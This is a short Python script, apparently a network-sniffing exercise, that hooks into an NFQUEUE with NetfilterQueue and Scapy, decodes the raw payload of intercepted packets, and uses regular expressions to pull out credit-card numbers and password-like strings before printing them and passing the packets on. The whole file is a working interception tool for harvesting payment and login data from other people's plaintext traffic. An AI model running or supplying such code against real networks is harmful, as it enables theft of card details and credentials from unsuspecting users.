from netfilterqueue import NetfilterQueue
from scapy.all import *
import re

cc = re.compile('[0-9]{4}\.[0-9]{4}\.[0-9]{4}\.[0-9]{4}')
pwd = re.compile('[0-9A-Z:;<>=?@.]+\s')


def print_and_accept(pkt):
    payld = pkt.get_payload()
    #temp = scapy.raw(temp)
    ip = IP(payld)
    if ip.haslayer(Raw):
        http = ip[Raw].load.decode()
        result1 = re.findall(cc, http)
        result2 = re.findall(pwd, http)
        print(result1, result2)
    pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
